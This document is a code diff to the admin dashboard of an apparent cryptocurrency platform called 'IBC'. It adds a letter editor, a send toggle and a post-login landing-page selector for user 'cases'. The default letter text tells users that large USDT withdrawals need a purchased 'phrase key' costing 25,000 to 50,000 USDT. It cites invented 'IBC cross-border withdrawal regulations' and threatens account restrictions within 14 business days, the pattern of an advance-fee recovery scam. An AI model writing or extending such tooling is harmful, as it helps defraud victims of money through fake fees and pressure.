@@ -16,7 +16,7 @@ import {
   TableRow 
 } from "@/components/ui/table";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
-import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload } from "lucide-react";
+import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload, Mail, MailCheck, MapPin, Settings } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
@@ -45,6 +45,12 @@ interface Case {
   depositAddress?: string;
   profileRedirectUrl?: string;
   hasRequirements?: boolean;
+  letterSent?: boolean;
+  landingPage?: string;
+  priority?: string;
+  assignedTo?: string;
+  tags?: string;
+  internalNotes?: string;
 }
 
 interface AdminMessage {
@@ -75,18 +81,29 @@ interface CaseLetter {
   introduction?: string;
   bodyContent?: string;
   footerNote?: string;
+  complianceReference?: string;
   optionATitle?: string;
   optionADescription?: string;
-  optionBTitle?: string;
-  optionBDescription?: string;
   optionAAmount?: string;
+  optionAFrequency?: string;
   optionABatches?: string;
+  optionAKeyCost?: string;
+  optionATotalRequirement?: string;
   optionATotalAmount?: string;
   optionAFilelocoId?: string;
+  optionBTitle?: string;
+  optionBDescription?: string;
   optionBAmount?: string;
+  optionBFrequency?: string;
   optionBBatches?: string;
+  optionBKeyCost?: string;
+  optionBTotalRequirement?: string;
   optionBTotalAmount?: string;
   optionBFilelocoId?: string;
+  phraseKeyRequirements?: string;
+  complianceNotice?: string;
+  scheduledFor?: string;
+  expiresAt?: string;
 }
 
 interface Submission {
@@ -151,11 +168,25 @@ export default function AdminDashboard() {
     introduction: "",
     bodyContent: "",
     footerNote: "",
+    complianceReference: "",
     optionATitle: "Accelerated Release",
     optionADescription: "",
+    optionAAmount: "",
+    optionAFrequency: "every 12 hours",
+    optionABatches: "",
+    optionAKeyCost: "",
+    optionATotalRequirement: "",
     optionBTitle: "Standard Release",
-    optionBDescription: ""
+    optionBDescription: "",
+    optionBAmount: "",
+    optionBFrequency: "every 12 hours",
+    optionBBatches: "",
+    optionBKeyCost: "",
+    optionBTotalRequirement: "",
+    phraseKeyRequirements: "",
+    complianceNotice: ""
   });
+  const [landingPageEdit, setLandingPageEdit] = useState("dashboard");
   const [finalizeData, setFinalizeData] = useState<AdminData>({
     vipStatus: "Gold Tier",
     username: "",
@@ -550,6 +581,7 @@ export default function AdminDashboard() {
     loadAdminMessages(caseData.id);
     setDepositAddressEdit(caseData.depositAddress || "");
     setProfileRedirectEdit(caseData.profileRedirectUrl || "");
+    setLandingPageEdit(caseData.landingPage || "dashboard");
     setIsAdminMessageOpen(true);
   };
 
@@ -615,6 +647,47 @@ export default function AdminDashboard() {
       }
     } catch (error) {
       toast({ variant: "destructive", title: "Error", description: "Failed to update profile redirect." });
+    }
+  };
+
+  const toggleLetterSent = async (caseData: Case) => {
+    try {
+      const res = await fetch(`/api/cases/${caseData.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ letterSent: !caseData.letterSent })
+      });
+      
+      if (res.ok) {
+        loadData();
+        toast({ 
+          title: caseData.letterSent ? "Letter Hidden" : "Letter Sent",
+          description: caseData.letterSent 
+            ? "The user can no longer view the letter." 
+            : "The user can now view the letter."
+        });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update letter status." });
+    }
+  };
+
+  const updateLandingPage = async () => {
+    if (!selectedCase) return;
+    
+    try {
+      const res = await fetch(`/api/cases/${selectedCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ landingPage: landingPageEdit })
+      });
+      
+      if (res.ok) {
+        loadData();
+        toast({ title: "Updated", description: "User landing page has been updated." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update landing page." });
     }
   };
 
@@ -707,10 +780,23 @@ export default function AdminDashboard() {
             introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
             bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
             footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
+            complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
             optionATitle: "Accelerated Release",
             optionADescription: "Full withdrawal amount processed in accelerated batches.",
+            optionAAmount: "500,000 USDT",
+            optionAFrequency: "every 12 hours",
+            optionABatches: "10",
+            optionAKeyCost: "50,000 USDT",
+            optionATotalRequirement: "50,000 USDT",
             optionBTitle: "Standard Release",
-            optionBDescription: "Half allocation processed in standard batches."
+            optionBDescription: "Half allocation processed in standard batches.",
+            optionBAmount: "250,000 USDT",
+            optionBFrequency: "every 24 hours",
+            optionBBatches: "5",
+            optionBKeyCost: "25,000 USDT",
+            optionBTotalRequirement: "25,000 USDT",
+            phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
+            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
           });
         }
       }
@@ -735,10 +821,23 @@ export default function AdminDashboard() {
             introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
             bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
             footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
+            complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
             optionATitle: "Accelerated Release",
             optionADescription: "Full withdrawal amount processed in accelerated batches.",
+            optionAAmount: "500,000 USDT",
+            optionAFrequency: "every 12 hours",
+            optionABatches: "10",
+            optionAKeyCost: "50,000 USDT",
+            optionATotalRequirement: "50,000 USDT",
             optionBTitle: "Standard Release",
-            optionBDescription: "Half allocation processed in standard batches."
+            optionBDescription: "Half allocation processed in standard batches.",
+            optionBAmount: "250,000 USDT",
+            optionBFrequency: "every 24 hours",
+            optionBBatches: "5",
+            optionBKeyCost: "25,000 USDT",
+            optionBTotalRequirement: "25,000 USDT",
+            phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
+            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
           });
         }
       }
@@ -1093,15 +1192,33 @@ export default function AdminDashboard() {
                                 </Button>
                               )}
                               {(c.status === 'active' || c.status === 'syncing') && (
-                                <Button 
-                                  size="sm" 
-                                  variant="outline"
-                                  className="border-slate-700 bg-slate-800"
-                                  onClick={() => openLetterEditor(c)}
-                                  data-testid={`button-edit-letter-${c.id}`}
-                                >
-                                  <Edit3 className="w-4 h-4 mr-1" /> Letter
-                                </Button>
+                                <>
+                                  <Button 
+                                    size="sm" 
+                                    variant="outline"
+                                    className="border-slate-700 bg-slate-800"
+                                    onClick={() => openLetterEditor(c)}
+                                    data-testid={`button-edit-letter-${c.id}`}
+                                  >
+                                    <Edit3 className="w-4 h-4 mr-1" /> Letter
+                                  </Button>
+                                  <Button 
+                                    size="sm" 
+                                    variant="outline"
+                                    className={c.letterSent 
+                                      ? "border-green-700 bg-green-900/50 text-green-400 hover:bg-green-800" 
+                                      : "border-slate-600 bg-slate-800/50 text-slate-400 hover:bg-slate-700"
+                                    }
+                                    onClick={() => toggleLetterSent(c)}
+                                    data-testid={`button-send-letter-${c.id}`}
+                                  >
+                                    {c.letterSent ? (
+                                      <><MailCheck className="w-4 h-4 mr-1" /> Sent</>
+                                    ) : (
+                                      <><Mail className="w-4 h-4 mr-1" /> Send</>
+                                    )}
+                                  </Button>
+                                </>
                               )}
                               {getCaseSubmissionCount(c.id) > 0 && (
                                 <Button 
@@ -1943,6 +2060,44 @@ export default function AdminDashboard() {
                 />
                 <Button onClick={updateProfileRedirect} size="sm">
                   <ExternalLink className="h-4 w-4 mr-1" /> Save
+                </Button>
+              </div>
+            </div>
+
+            {/* Landing Page Preference */}
+            <div className="space-y-2">
+              <Label className="text-slate-300 flex items-center gap-2">
+                <MapPin className="h-4 w-4" /> User Landing Page
+              </Label>
+              <p className="text-xs text-slate-500 mb-2">Choose which page the user sees after logging in</p>
+              <div className="flex gap-2">
+                <Select value={landingPageEdit} onValueChange={setLandingPageEdit}>
+                  <SelectTrigger className="bg-slate-900 border-slate-700 text-white flex-1">
+                    <SelectValue />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="dashboard">
+                      <span className="flex items-center gap-2">Dashboard (Default)</span>
+                    </SelectItem>
+                    <SelectItem value="letter">
+                      <span className="flex items-center gap-2">Withdrawal Letter</span>
+                    </SelectItem>
+                    <SelectItem value="deposit">
+                      <span className="flex items-center gap-2">Deposit Information</span>
+                    </SelectItem>
+                    <SelectItem value="messages">
+                      <span className="flex items-center gap-2">Required Actions</span>
+                    </SelectItem>
+                    <SelectItem value="chat">
+                      <span className="flex items-center gap-2">Support Chat</span>
+                    </SelectItem>
+                    <SelectItem value="history">
+                      <span className="flex items-center gap-2">Submission History</span>
+                    </SelectItem>
+                  </SelectContent>
+                </Select>
+                <Button onClick={updateLandingPage} size="sm">
+                  <Settings className="h-4 w-4 mr-1" /> Save
                 </Button>
               </div>
             </div>
